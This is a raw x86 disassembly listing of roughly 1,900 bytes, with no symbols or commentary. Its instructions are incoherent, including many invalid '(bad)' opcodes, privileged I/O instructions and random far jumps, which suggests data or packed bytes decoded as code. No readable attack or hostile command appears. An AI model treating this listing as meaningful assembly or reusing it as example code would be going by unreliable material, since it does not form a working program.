  4129ff:	pop    eax
  412a00:	rcr    esi,0x15
  412a03:	aaa    
  412a04:	sbb    edi,ebp
  412a06:	in     al,dx
  412a07:	ins    DWORD PTR es:[edi],dx
  412a08:	xchg   ebx,eax
  412a09:	push   ds
  412a0a:	mov    dh,0xc9
  412a0c:	and    esi,DWORD PTR [ebx+0x69]
  412a0f:	mov    ds:0x99edd15b,al
  412a14:	jle    0x412a0d
  412a16:	inc    esp
  412a17:	imul   BYTE PTR [eax+0x739dd74e]
  412a1d:	dec    eax
  412a1e:	in     eax,dx
  412a1f:	ja     0x412a74
  412a21:	dec    eax
  412a22:	xor    eax,0xf88531a8
  412a27:	scas   al,BYTE PTR es:[edi]
  412a28:	mov    dl,0xa3
  412a2a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412a2b:	addr16 mov ah,0x18
  412a2e:	lods   al,BYTE PTR ds:[esi]
  412a2f:	test   eax,0xc102022d
  412a34:	fnsave [eax]
  412a36:	or     bl,BYTE PTR fs:[eax+ecx*8+0x35b1ec1e]
  412a3e:	pop    ebp
  412a3f:	in     eax,dx
  412a40:	xor    eax,0x362f8e09
  412a45:	sub    DWORD PTR [edx],esp
  412a47:	fcom   DWORD PTR [eax-0x2c6505e1]
  412a4d:	ins    BYTE PTR es:[edi],dx
  412a4e:	retf   0x438d
  412a51:	ins    DWORD PTR es:[edi],dx
  412a52:	sub    eax,0x95fcba87
  412a57:	daa    
  412a58:	je     0x4129f8
  412a5a:	jno    0x412a1d
  412a5c:	or     al,0x49
  412a5e:	push   esi
  412a5f:	or     DWORD PTR [ecx-0x135d4c44],edi
  412a65:	push   ebx
  412a66:	add    ah,BYTE PTR [ecx+ebp*8+0x79]
  412a6a:	mov    ah,0xd3
  412a6c:	loope  0x412ae0
  412a6e:	xlat   BYTE PTR ds:[ebx]
  412a6f:	or     bh,BYTE PTR [ecx]
  412a71:	inc    esi
  412a72:	inc    ebx
  412a73:	fs aam 0xdf
  412a76:	mov    bh,BYTE PTR [edx+0x4434deff]
  412a7c:	xor    eax,0x2b788baa
  412a81:	xor    al,BYTE PTR [ebp+0x70711135]
  412a87:	lods   eax,DWORD PTR ds:[esi]
  412a88:	inc    ebp
  412a89:	mov    bl,BYTE PTR [esi+0x1d]
  412a8c:	pop    ebp
  412a8d:	(bad)  
  412a8e:	(bad)  
  412a8f:	in     al,dx
  412a90:	cwde   
  412a91:	mov    edx,0x67afb150
  412a96:	xchg   edx,eax
  412a97:	mov    al,BYTE PTR [eax-0x4c]
  412a9a:	mov    al,ds:0x164c82fc
  412a9f:	(bad)  
  412aa1:	loop   0x412a8d
  412aa3:	sti    
  412aa4:	popa   
  412aa5:	xchg   ebp,eax
  412aa6:	xlat   BYTE PTR ds:[ebx]
  412aa7:	mov    cl,0x8
  412aa9:	lds    edx,FWORD PTR [ebx+0x70fc23f3]
  412aaf:	leave  
  412ab0:	sbb    ah,BYTE PTR [esi-0x14]
  412ab3:	pop    ebp
  412ab4:	mov    al,0xf4
  412ab6:	daa    
  412ab7:	cld    
  412ab8:	pop    ebx
  412ab9:	cwde   
  412aba:	pop    eax
  412abb:	cwde   
  412abc:	cs jne 0x412a57
  412abf:	cdq    
  412ac0:	mov    al,0xc
  412ac2:	sbb    BYTE PTR [eax-0x21],0xf1
  412ac6:	hlt    
  412ac7:	sub    bh,ah
  412ac9:	jg     0x412a9e
  412acb:	(bad)  
  412acc:	das    
  412acd:	or     eax,0xd2783732
  412ad2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412ad3:	xor    BYTE PTR [edi*1-0x7c530b1a],dl
  412ada:	pop    eax
  412adb:	dec    edx
  412adc:	xchg   esp,eax
  412add:	mov    bh,0xf6
  412adf:	push   es
  412ae0:	and    BYTE PTR [edx+0x11],0xd
  412ae4:	sahf   
  412ae5:	imul   ebp,ebx,0x3b
  412ae8:	not    DWORD PTR [ebx-0x25aa791f]
  412aee:	imul   edi
  412af0:	outs   dx,BYTE PTR ds:[esi]
  412af1:	push   esi
  412af2:	fadd   QWORD PTR [edi]
  412af4:	jno    0x412b6c
  412af6:	(bad)  
  412af7:	cmp    eax,0xb6be01ab
  412afc:	push   0x70ccdc5f
  412b01:	adc    esi,DWORD PTR [edx]
  412b03:	imul   edx,DWORD PTR [eax-0x54],0xffffffff
  412b07:	pop    edi
  412b08:	or     dh,BYTE PTR [ebx]
  412b0a:	sbb    edx,esp
  412b0c:	or     ah,ah
  412b0e:	add    eax,0x823ccfab
  412b13:	mov    ebp,0x25218ccd
  412b18:	mov    esi,DWORD PTR ds:[ebp+eax*1+0x37]
  412b1d:	jle    0x412b9c
  412b1f:	lds    edi,FWORD PTR [esi]
  412b21:	fcomp  QWORD PTR [ebp-0x54]
  412b24:	sbb    eax,0x175f3a38
  412b29:	mov    ebx,0x527d5f61
  412b2e:	scas   eax,DWORD PTR es:[edi]
  412b2f:	cdq    
  412b30:	xor    esp,DWORD PTR [edx-0x2a]
  412b33:	ss out dx,al
  412b35:	jns    0x412b5c
  412b37:	(bad)  
  412b38:	fs dec esi
  412b3a:	out    0x8f,al
  412b3c:	dec    esi
  412b3d:	mov    al,0x83
  412b3f:	cld    
  412b40:	xchg   edx,eax
  412b41:	or     bh,BYTE PTR [eax-0x56be3e0c]
  412b47:	jno    0x412b00
  412b49:	ins    DWORD PTR es:[edi],dx
  412b4a:	sub    ecx,DWORD PTR [eax]
  412b4c:	ins    BYTE PTR es:[edi],dx
  412b4d:	xor    al,cl
  412b4f:	cmc    
  412b50:	cmp    eax,0x7027e0d9
  412b55:	inc    ebp
  412b56:	and    eax,0x7971698b
  412b5b:	ins    BYTE PTR es:[edi],dx
  412b5c:	(bad)  
  412b5d:	jmp    0x81b:0xac4ea5e4
  412b64:	jnp    0x412b3c
  412b66:	xor    DWORD PTR [eax],edx
  412b68:	dec    edi
  412b69:	xor    esi,ebp
  412b6b:	loop   0x412b8c
  412b6d:	push   es
  412b6e:	stos   DWORD PTR es:[edi],eax
  412b6f:	pop    eax
  412b70:	add    BYTE PTR [eax-0x307c32e0],ch
  412b76:	push   edi
  412b77:	je     0x412ba2
  412b79:	pop    ebp
  412b7a:	test   BYTE PTR [edi],0x7d
  412b7d:	cmp    BYTE PTR [ecx],dl
  412b7f:	add    al,0x9a
  412b81:	mov    cl,0xfe
  412b83:	sub    eax,0xcf591ab6
  412b88:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412b89:	cld    
  412b8a:	lea    esp,[ecx+0x2b]
  412b8d:	out    dx,al
  412b8e:	daa    
  412b8f:	test   eax,0x6021d397
  412b94:	pop    eax
  412b95:	or     edi,ebp
  412b97:	jne    0x412ba6
  412b99:	cmc    
  412b9a:	jg     0x412bd1
  412b9c:	aas    
  412b9d:	call   0xf039e84c
  412ba2:	stc    
  412ba3:	and    eax,DWORD PTR [ebx+0x2629000e]
  412ba9:	mov    BYTE PTR [edi+0x1e54b50d],ah
  412baf:	cmp    al,0x5c
  412bb1:	mov    edi,0x4a34aa3e
  412bb6:	int    0x6e
  412bb8:	aaa    
  412bb9:	mov    esi,0xac30e625
  412bbe:	push   0xffffffe0
  412bc0:	cmp    BYTE PTR [ebx-0x3d],al
  412bc3:	push   cs
  412bc4:	sbb    eax,eax
  412bc6:	(bad)  
  412bc7:	lock icebp 
  412bc9:	fisubr WORD PTR [edi]
  412bcb:	out    dx,eax
  412bcc:	retf   
  412bcd:	loop   0x412c48
  412bcf:	xchg   esi,eax
  412bd0:	pop    ebp
  412bd1:	adc    bh,BYTE PTR [ecx-0x4]
  412bd4:	pop    ds
  412bd5:	xchg   WORD PTR [ebx+0x2d],di
  412bd9:	gs int3 
  412bdb:	data16 je 0x412c42
  412bde:	ds push 0x97abb3f0
  412be4:	jmp    0xf5548916
  412be9:	je     0x412c4a
  412beb:	add    eax,0x200a5e6c
  412bf0:	sub    BYTE PTR [esi],ah
  412bf2:	pop    ebp
  412bf3:	pop    esp
  412bf4:	and    al,0x82
  412bf7:	xor    al,0x81
  412bf9:	cmp    cl,bh
  412bfb:	sub    BYTE PTR [edx+0x66],ch
  412bfe:	mov    ecx,0xc5d802d0
  412c03:	mov    al,ds:0x5a6fa2fc
  412c08:	rcl    BYTE PTR [ebp+0x58534257],cl
  412c0e:	xor    ah,cl
  412c10:	inc    sp
  412c12:	(bad)  
  412c13:	cmp    esi,DWORD PTR [edi]
  412c15:	ror    esp,0x2c
  412c18:	cmp    BYTE PTR [edi],bl
  412c1a:	jge    0x412b9c
  412c1c:	sbb    bl,cl
  412c1e:	stc    
  412c1f:	push   ds
  412c20:	ja     0x412ba8
  412c22:	and    eax,0x39a632e3
  412c27:	(bad)  
  412c28:	xcrypt-ctr (bad)
  412c29:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412c2a:	pop    eax
  412c2b:	jae    0x412c0b
  412c2d:	ins    BYTE PTR es:[edi],dx
  412c2e:	das    
  412c2f:	push   cs
  412c30:	sub    eax,0xa6679eb0
  412c35:	or     DWORD PTR [ecx],ebp
  412c37:	xchg   BYTE PTR [edx],al
  412c39:	jb     0x412ca0
  412c3b:	sbb    BYTE PTR [edx+0x52208d41],cl
  412c41:	push   ebx
  412c42:	push   ds
  412c43:	cmp    ah,dh
  412c45:	xchg   ch,ah
  412c47:	(bad)  
  412c48:	jmp    0x6aa2:0xa7da9008
  412c4f:	out    dx,al
  412c50:	pop    edx
  412c51:	data16 mov gs,WORD PTR [ecx]
  412c54:	mov    ebx,0x8a9c4dd0
  412c59:	lahf   
  412c5a:	(bad)
  412c5e:	push   edi
  412c5f:	retf   0xcf3a
  412c62:	outs   dx,DWORD PTR ds:[esi]
  412c63:	pop    ebp
  412c64:	mov    ?,WORD PTR cs:[ebx+0x2d9f67d1]
  412c6b:	mov    ch,0x20
  412c6d:	push   0x7ef74715
  412c72:	(bad)  [ecx+ebp*1]
  412c75:	adc    eax,0x27333abb
  412c7a:	stos   BYTE PTR es:[edi],al
  412c7b:	adc    DWORD PTR [edx-0x18763e53],ebp
  412c81:	xchg   BYTE PTR [esi],ch
  412c83:	or     dl,BYTE PTR fs:[edx-0x3377bdac]
  412c8a:	aam    0xf3
  412c8c:	mov    al,dh
  412c8e:	xchg   edx,eax
  412c8f:	sub    BYTE PTR [ecx],dh
  412c91:	out    0x47,al
  412c93:	int3   
  412c94:	imul   edi,DWORD PTR [edi-0x3f],0x9529d648
  412c9b:	shl    dl,1
  412c9d:	cmc    
  412c9e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412c9f:	adc    esp,edx
  412ca1:	js     0x412c4b
  412ca3:	mov    ?,WORD PTR [ebp+0xa]
  412ca6:	dec    DWORD PTR [ecx]
  412ca8:	and    al,0x88
  412caa:	sbb    eax,0xf39ab72e
  412caf:	pop    ecx
  412cb0:	cmp    ch,BYTE PTR [ebx-0x23]
  412cb3:	mov    DWORD PTR [ebx+eax*1+0x1a],edi
  412cb7:	fwait
  412cb8:	push   edx
  412cb9:	scas   al,BYTE PTR es:[edi]
  412cba:	rcr    al,cl
  412cbc:	cmp    al,0x46
  412cbe:	jmp    0x35776e57
  412cc3:	adc    ebx,DWORD PTR [eax+0x2b]
  412cc6:	push   ebx
  412cc7:	xchg   DWORD PTR [ebp-0x4e],eax
  412cca:	cwde   
  412ccb:	sti    
  412ccc:	popf   
  412ccd:	std    
  412cce:	(bad)  
  412ccf:	leave  
  412cd0:	int3   
  412cd1:	mov    bl,0xe0
  412cd3:	inc    esp
  412cd4:	mov    ebx,0x53f8d485
  412cd9:	sahf   
  412cda:	jo     0x412d5a
  412cdc:	jo     0x412d50
  412cde:	pop    DWORD PTR [ecx-0xd81349f]
  412ce4:	jmp    0x412c79
  412ce6:	sbb    dh,BYTE PTR [edi+0x94d612d]
  412cec:	inc    BYTE PTR [ebx-0x21]
  412cef:	sti    
  412cf0:	scas   al,BYTE PTR es:[edi]
  412cf1:	lahf   
  412cf2:	imul   edi,DWORD PTR [edi],0xae00e949
  412cf8:	or     DWORD PTR [bx+di-0x70],edx
  412cfc:	loop   0x412ca1
  412cfe:	adc    eax,0xae190c71
  412d03:	outs   dx,WORD PTR ds:[esi]
  412d05:	div    ebp
  412d07:	pop    ds
  412d08:	inc    bl
  412d0a:	inc    esi
  412d0b:	xor    cl,BYTE PTR [edi-0x23394908]
  412d11:	ins    DWORD PTR es:[edi],dx
  412d12:	sub    esp,DWORD PTR [edx-0x3ce31546]
  412d18:	pop    es
  412d19:	fmul   DWORD PTR [ecx]
  412d1b:	xchg   ecx,eax
  412d1c:	pop    es
  412d1d:	cmp    eax,0xbb4a8a09
  412d22:	rcr    DWORD PTR ds:0x29496c32,1
  412d28:	add    cl,dh
  412d2a:	or     DWORD PTR [edx-0x28],ebp
  412d2d:	ror    DWORD PTR cs:[ebx],1
  412d30:	xor    BYTE PTR [eax],0xcc
  412d33:	aas    
  412d34:	lds    ecx,FWORD PTR [ebx+0x29]
  412d37:	lock mov esp,0x6b96a642
  412d3d:	mov    dl,0x31
  412d3f:	fistp  DWORD PTR [eax+0x61]
  412d42:	pop    ebp
  412d43:	lds    esp,FWORD PTR [edi-0x55]
  412d46:	adc    ebx,eax
  412d48:	or     ah,BYTE PTR [esi]
  412d4a:	mov    bh,0x3c
  412d4c:	cmp    DWORD PTR [ebx],ebp
  412d4e:	and    DWORD PTR [eax],ebp
  412d50:	mov    ecx,0x8e640ead
  412d55:	(bad)  
  412d57:	adc    edi,esi
  412d59:	and    eax,edi
  412d5b:	jg     0x412d6a
  412d5d:	iret   
  412d5e:	xor    al,0x7e
  412d60:	cmp    edx,ebx
  412d62:	hlt    
  412d63:	jmp    0xdf21:0x6bfb37d6
  412d6a:	or     eax,0x5d95291c
  412d6f:	dec    esp
  412d70:	xor    al,0xea
  412d72:	pushf  
  412d73:	arpl   ax,cx
  412d75:	mov    ch,0x50
  412d77:	adc    al,0x9e
  412d79:	push   0xffffffa9
  412d7b:	cdq    
  412d7c:	dec    ecx
  412d7d:	lahf   
  412d7e:	fbstp  TBYTE PTR [edi]
  412d80:	test   BYTE PTR [ebx],al
  412d82:	mov    esi,0x939a7432
  412d87:	(bad)  
  412d88:	loop   0x412d70
  412d8a:	out    dx,al
  412d8b:	jmp    DWORD PTR [eax]
  412d8d:	into   
  412d8e:	sub    esp,esp
  412d90:	arpl   WORD PTR [esi],cx
  412d92:	push   es
  412d93:	aaa    
  412d94:	jle    0xc14eb679
  412d9a:	scas   al,BYTE PTR es:[edi]
  412d9b:	xchg   edx,eax
  412d9c:	rcl    BYTE PTR [edi],cl
  412d9e:	xchg   edx,eax
  412d9f:	pop    ebp
  412da0:	clc    
  412da1:	sbb    eax,0xa746cec9
  412da6:	test   BYTE PTR [esi-0x565a9615],ch
  412dac:	test   BYTE PTR [edx],al
  412dae:	aad    0xb7
  412db0:	lods   al,BYTE PTR ds:[esi]
  412db1:	xchg   BYTE PTR [ebp-0x74],ah
  412db4:	loop   0x412e1c
  412db6:	(bad)  
  412db7:	rcr    BYTE PTR [ebp+0x4f],0x77
  412dbb:	and    al,cl
  412dbd:	in     eax,0xeb
  412dbf:	in     al,dx
  412dc0:	aaa    
  412dc1:	jo     0x412d78
  412dc3:	in     eax,dx
  412dc4:	mov    al,0x50
  412dc6:	dec    ebx
  412dc7:	shl    bh,cl
  412dc9:	mov    al,ds:0x69520682
  412dce:	jno    0x412dd7
  412dd0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412dd1:	in     eax,0xc
  412dd3:	add    BYTE PTR ds:0x57822f5a,0x4e
  412dda:	pushf  
  412ddb:	ja     0x412d70
  412ddd:	add    al,0xeb
  412ddf:	idiv   BYTE PTR [esp+eax*4]
  412de2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412de3:	mov    ds:0xadb0b8c0,al
  412de8:	mov    al,0xb7
  412dea:	cmovbe esp,ebp
  412ded:	xchg   esi,eax
  412dee:	call   0x65f5265a
  412df3:	rol    DWORD PTR [edi+0xf24ede3],1
  412df9:	das    
  412dfa:	mov    WORD PTR [ebp-0x4c],es
  412dfd:	push   eax
  412dfe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412dff:	push   cs
  412e00:	shl    BYTE PTR [ebx-0x6f],0x6c
  412e04:	push   ecx
  412e05:	out    dx,al
  412e06:	or     esi,DWORD PTR [ecx-0x48]
  412e09:	xor    al,0x8c
  412e0b:	sbb    BYTE PTR [ecx-0x30f7dfa2],al
  412e11:	xor    al,0x36
  412e13:	jns    0x412dcc
  412e15:	aaa    
  412e16:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  412e18:	cs xchg ebx,ecx
  412e1b:	jecxz  0x412dfc
  412e1d:	jmp    0x412e28
  412e1f:	jp     0x412df0
  412e21:	div    BYTE PTR [ecx-0x2fac1ff0]
  412e27:	sbb    esp,esp
  412e29:	leave  
  412e2a:	inc    eax
  412e2b:	std    
  412e2c:	inc    edx
  412e2d:	inc    edi
  412e2e:	int    0xd8
  412e30:	jne    0x412e61
  412e32:	repnz int3 
  412e34:	mov    cl,0x7d
  412e36:	jns    0x412e8d
  412e38:	retf   
  412e39:	loopne 0x412e52
  412e3b:	xchg   esi,ecx
  412e3d:	aad    0x2a
  412e3f:	sahf   
  412e40:	inc    ebp
  412e41:	imul   BYTE PTR [ebx+0x23]
  412e44:	xlat   BYTE PTR ds:[ebx]
  412e45:	je     0x412e3c
  412e47:	jbe    0x412eb5
  412e49:	cli    
  412e4a:	popa   
  412e4b:	gs mov edx,0x6d797d6a
  412e51:	jbe    0x412de4
  412e53:	and    DWORD PTR [esp+eax*4],0xff80785f
  412e5a:	mov    cl,0x42
  412e5c:	xchg   esp,eax
  412e5d:	pop    esi
  412e5e:	and    edx,eax
  412e60:	mov    ah,0xec
  412e62:	cwde   
  412e63:	mov    ds:0x70ad7c9d,al
  412e68:	xchg   BYTE PTR [eax-0x5b3584bd],bh
  412e6e:	jle    0x412e71
  412e70:	dec    esi
  412e71:	nop
  412e72:	jecxz  0x412e1f
  412e74:	inc    ebp
  412e75:	sub    eax,0x2049cb30
  412e7a:	inc    ebx
  412e7b:	mov    edx,0x6aa31555
  412e80:	sub    al,0xd9
  412e82:	mov    bh,0xc9
  412e84:	lahf   
  412e85:	adc    BYTE PTR [ebp+0x4d68c80d],ch
  412e8b:	jbe    0x412e2d
  412e8d:	jmp    0x412e46
  412e8f:	fmul   DWORD PTR [edx]
  412e91:	xchg   ebx,eax
  412e92:	adc    eax,0x470b6b58
  412e97:	sbb    BYTE PTR [esp+eiz*8],dh
  412e9a:	pop    es
  412e9b:	and    BYTE PTR [esi*2+0x441299b8],0xd0
  412ea3:	mov    edi,0xbe653f52
  412ea8:	fadd   st,st(5)
  412eaa:	or     BYTE PTR [edi-0x61],ah
  412ead:	and    edi,DWORD PTR [eax-0x73d81385]
  412eb3:	adc    al,0xc4
  412eb5:	ret    
  412eb6:	stos   BYTE PTR es:[edi],al
  412eb7:	cmp    DWORD PTR [ecx+0x66afb26e],esi
  412ebd:	adc    ah,BYTE PTR [ebp+0x170491b4]
  412ec3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412ec4:	imul   ebp,DWORD PTR [edx],0x7c
  412ec7:	sbb    BYTE PTR [eax-0x18e7a63b],0x52
  412ece:	shl    BYTE PTR [esp+eiz*2],1
  412ed1:	les    edi,FWORD PTR [ebp+esi*8+0x534dd8cb]
  412ed8:	xchg   ebx,eax
  412ed9:	mov    eax,0xa49de6cb
  412ede:	xchg   ebx,eax
  412edf:	fmul   DWORD PTR [edi+0x4a]
  412ee2:	push   cs
  412ee3:	aad    0xc8
  412ee5:	inc    ecx
  412ee6:	push   esi
  412ee7:	inc    ebx
  412ee8:	xchg   ebx,eax
  412ee9:	in     al,dx
  412eea:	jge    0x412f00
  412eec:	xchg   BYTE PTR [edi],ah
  412eee:	jbe    0x412ed5
  412ef0:	push   edx
  412ef1:	scas   eax,DWORD PTR es:[edi]
  412ef2:	jmp    0x164e695b
  412ef7:	cdq    
  412ef8:	push   ebx
  412ef9:	push   0xffffffa3
  412efb:	mov    BYTE PTR [ebp+0x45],bh
  412efe:	pusha  
  412eff:	test   DWORD PTR [edx-0x4d],edi
  412f02:	int3   
  412f03:	xchg   edx,eax
  412f04:	hlt    
  412f05:	leave  
  412f06:	std    
  412f07:	(bad)  
  412f08:	frstor [ebx+ebp*4+0x17]
  412f0c:	dec    ebp
  412f0d:	je     0x412eb0
  412f0f:	int    0xcd
  412f11:	mov    al,ds:0xe53fc24a
  412f16:	scas   al,BYTE PTR es:[edi]
  412f17:	pop    ecx
  412f18:	mov    bl,0x41
  412f1a:	(bad)  
  412f1b:	mov    eax,0xabaad108
  412f20:	shr    DWORD PTR ds:0x1cf622e4,cl
  412f26:	shl    BYTE PTR [ecx+0x185305b0],1
  412f2c:	ret    0xe888
  412f2f:	mov    ecx,0xa4efd37d
  412f34:	sahf   
  412f35:	pop    eax
  412f36:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412f37:	or     bl,dh
  412f39:	sbb    al,0x54
  412f3b:	adc    al,0xd3
  412f3d:	inc    ebx
  412f3e:	in     eax,0x43
  412f40:	pop    ecx
  412f41:	mov    ch,0xa4
  412f43:	(bad)  
  412f44:	sbb    ch,ch
  412f46:	div    DWORD PTR [eax+ebp*4+0x66012d3b]
  412f4d:	xor    ch,bl
  412f4f:	loopne 0x412f85
  412f51:	add    cl,BYTE PTR [ebx-0x2e]
  412f54:	icebp  
  412f55:	loope  0x412eda
  412f57:	mov    dl,0x18
  412f59:	shl    ebx,cl
  412f5b:	fiadd  WORD PTR [esi-0x50]
  412f5e:	inc    eax
  412f5f:	outs   dx,DWORD PTR ds:[esi]
  412f60:	mov    ds:0x1e8014e5,al
  412f65:	pop    ecx
  412f66:	push   ecx
  412f67:	jmp    0x412fbe
  412f69:	(bad)  
  412f6a:	rcl    BYTE PTR [ebx+eax*4-0x12],1
  412f6e:	stc    
  412f6f:	std    
  412f70:	xchg   ecx,eax
  412f71:	adc    dh,BYTE PTR [edx+0x713c2e69]
  412f77:	add    esi,edx
  412f79:	jle    0x412f67
  412f7b:	xchg   edi,eax
  412f7c:	dec    ebx
  412f7d:	sub    eax,0xbc71a4b1
  412f82:	mov    esp,0xa65d7510
  412f87:	pop    ds
  412f88:	sbb    eax,0x7c2ac8b5
  412f8d:	loope  0x412f50
  412f8f:	loop   0x412f40
  412f91:	cdq    
  412f92:	cdq    
  412f93:	ror    DWORD PTR [ecx],cl
  412f95:	cmp    al,0xcc
  412f97:	sbb    al,0x84
  412f99:	icebp  
  412f9a:	xchg   esp,eax
  412f9b:	and    DWORD PTR [edi-0xca374dc],esp
  412fa1:	push   ss
  412fa2:	xchg   ebp,eax
  412fa3:	jo     0x412fc7
  412fa5:	fisub  DWORD PTR [ebp-0x24c12b1d]
  412fab:	cld    
  412fac:	inc    ebx
  412fad:	jle    0x412fec
  412faf:	stos   BYTE PTR es:[edi],al
  412fb0:	and    ah,ah
  412fb2:	hlt    
  412fb3:	mov    cl,0x44
  412fb5:	retf   0xb86e
  412fb8:	iret   
  412fb9:	sbb    BYTE PTR [ebx-0x19b2de0],bl
  412fbf:	iret   
  412fc0:	test   eax,0x34763ef5
  412fc5:	hlt    
  412fc6:	push   edx
  412fc7:	xlat   BYTE PTR ds:[ebx]
  412fc8:	add    eax,DWORD PTR [edx+0xb]
  412fcb:	and    dl,BYTE PTR [eax]
  412fcd:	std    
  412fce:	outs   dx,DWORD PTR ds:[esi]
  412fcf:	adc    BYTE PTR [ecx],bl
  412fd1:	addr16 inc edi
  412fd3:	cmp    ah,bh
  412fd5:	scas   eax,DWORD PTR es:[edi]
  412fd6:	mov    edi,0x4e357d07
  412fdb:	test   DWORD PTR [ebx+edi*1-0x2f650832],ebp
  412fe2:	inc    ebx
  412fe3:	cwde   
  412fe4:	jnp    0x413032
  412fe6:	jns    0x41303f
  412fe8:	sahf   
  412fe9:	dec    ebp
  412fea:	iret   
  412feb:	mov    ds:0xbd2e313c,al
  412ff0:	push   cs
  412ff1:	push   esi
  412ff2:	or     DWORD PTR [ecx-0x4130863c],ecx
  412ff8:	aad    0x26
  412ffa:	imul   ebp,DWORD PTR [edx-0x67],0xec3cebcc
  413001:	mov    ?,WORD PTR [ecx]
  413003:	mov    al,ds:0x5588de93
  413008:	loope  0x41303a
  41300a:	out    0x6c,al
  41300c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41300d:	xchg   edx,eax
  41300e:	adc    DWORD PTR [edx+eax*1-0x5792e536],0xe5e1a7d8
  413019:	fistp  QWORD PTR ss:[esi-0x60cfe1be]
  413020:	fdiv   DWORD PTR [ecx-0x2e5e2a3f]
  413026:	ins    DWORD PTR es:[edi],dx
  413027:	es or  bl,al
  41302a:	jg     0x413058
  41302c:	cli    
  41302d:	or     BYTE PTR ds:0x6cab7a3b,bl
  413033:	and    DWORD PTR [ebx],eax
  413035:	push   cs
  413036:	push   ss
  413037:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413038:	sbb    ch,BYTE PTR [eax-0x18]
  41303b:	add    eax,0x3181ab88
  413040:	mov    dh,0xab
  413042:	icebp  
  413043:	and    esp,esp
  413045:	pop    ecx
  413046:	jb     0x41303e
  413048:	sub    DWORD PTR [ebx],ebx
  41304a:	mov    DWORD PTR [ecx-0x36],esp
  41304d:	lods   al,BYTE PTR ds:[esi]
  41304e:	lods   al,BYTE PTR ds:[esi]
  41304f:	imul   edx,DWORD PTR [esi-0x1367f9d5],0xffffff99
  413056:	push   es
  413057:	mov    WORD PTR [edx+0x3a7dcccd],es
  41305d:	mov    ch,0x76
  41305f:	and    eax,0xaf710ada
  413064:	in     ax,dx
  413066:	ds xchg esi,eax
  413068:	lods   al,BYTE PTR ds:[esi]
  413069:	or     BYTE PTR [esi+0x6d],dl
  41306c:	dec    ecx
  41306d:	add    BYTE PTR [esi-0x2afecd39],dl
  413073:	sbb    al,0x3f
  413075:	fimul  WORD PTR [edx-0x5c]
  413078:	das    
  413079:	push   ebp
  41307a:	sbb    eax,DWORD PTR [ebx+0x758cda05]
  413080:	loope  0x41300c
  413082:	mov    ds:0x4d726b7d,al
  413087:	rcl    BYTE PTR [edi+0x287b9faf],0x1
  41308e:	jne    0x41308e
  413090:	inc    ecx
  413091:	xor    eax,DWORD PTR [eax]
  413093:	inc    esp
  413094:	push   ss
  413095:	xor    al,dh
  413097:	test   ch,0xeb
  41309a:	mov    ecx,0x6c28cf6a
  41309f:	enter  0xad90,0xd3
  4130a3:	sub    edi,esi
  4130a5:	pop    es
  4130a6:	sub    BYTE PTR [ecx],bh
  4130a8:	hlt    
  4130a9:	add    ecx,DWORD PTR [ecx+0x108422e3]
  4130af:	enter  0xb19d,0x9c
  4130b3:	lea    edx,[esi]
  4130b5:	mov    eax,ds:0x5a70ea85
  4130ba:	loop   0x413063
  4130bc:	fnstcw WORD PTR [edi+edi*8+0x51b9bda6]
  4130c3:	mov    edx,DWORD PTR [esi-0x4b9f2687]
  4130c9:	mov    cl,0x89
  4130cb:	push   edi
  4130cc:	rol    DWORD PTR [edi],1
  4130ce:	retf   
  4130cf:	(bad)  
  4130d1:	data16 fcos 
  4130d4:	scas   al,BYTE PTR es:[edi]
  4130d5:	stc    
  4130d6:	push   ebx
  4130d7:	dec    al
  4130d9:	lock or ebp,DWORD PTR [ebx]
  4130dc:	shl    DWORD PTR [esi+0x637926ad],cl
  4130e2:	aaa    
  4130e3:	aam    0xe4
  4130e5:	push   ebp
  4130e6:	pop    esp
  4130e7:	int    0x5f
  4130e9:	sub    eax,0xc60ae32b
  4130ee:	pushf  
  4130ef:	dec    ecx
  4130f0:	repz add BYTE PTR [ebx-0x4f],dl
  4130f4:	mov    gs,WORD PTR [ebx]
  4130f6:	ror    BYTE PTR [esi+0x701d5028],cl
  4130fc:	ds test dh,ah
  4130ff:	pusha  
  413100:	ja     0x4130aa
  413102:	push   ecx
  413103:	inc    esi
  413104:	jmp    0x41313c
  413106:	jnp    0x413111
  413108:	test   eax,0x537b22a5
  41310d:	std    
  41310e:	neg    DWORD PTR [ebx+ebp*1]
  413111:	adc    esi,DWORD PTR [ebx+0x6]
  413114:	dec    esp
  413115:	das    
  413116:	sar    BYTE PTR [esi],1
  413118:	push   0x4686eeba
  41311d:	push   ebp
  41311e:	inc    ebx
  41311f:	cmp    eax,0x6ce37106
  413124:	int    0x60
  413126:	aad    0xa3
  413128:	jae    0x4131a0
  41312a:	and    al,ch
  41312c:	sbb    al,0x62
  41312e:	fimul  WORD PTR [eax-0x7]
  413131:	pop    ebp
  413132:	imul   esp,DWORD PTR [edx-0x18],0xe68603bd
  413139:	scas   eax,DWORD PTR es:[edi]
  41313a:	test   al,0x65
  41313c:	cwde   
  41313d:	ret    
  41313e:	jp     0x413123
  413140:	pusha  
  413141:	adc    ecx,ebx
  413143:	xor    esi,DWORD PTR [edx+0x4bc61012]
  413149:	xor    ebx,DWORD PTR gs:[edx+0x8334bf2]
  413150:	repz xchg esp,eax
  413152:	nop
  413153:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  413155:	mov    ds:0x535697c6,al
  41315a:	loop   0x413177
  41315c:	and    ch,BYTE PTR [esi+0x20452e48]
  413162:	jge    0x413178
  413164:	test   eax,0x728d426c
  413169:	stos   DWORD PTR es:[edi],eax
  41316a:	cmp    eax,DWORD PTR [eax+eax*2-0x1229c8c9]
  413171:	imul   ebp,DWORD PTR [esi+0x747f95fb],0xffffffd8
  413178:	xchg   ecx,eax
  413179:	cmp    eax,DWORD PTR [esi]
  41317b:	inc    esi
  41317c:	or     DWORD PTR [eax-0x44],eax
  41317f:	xchg   edx,eax
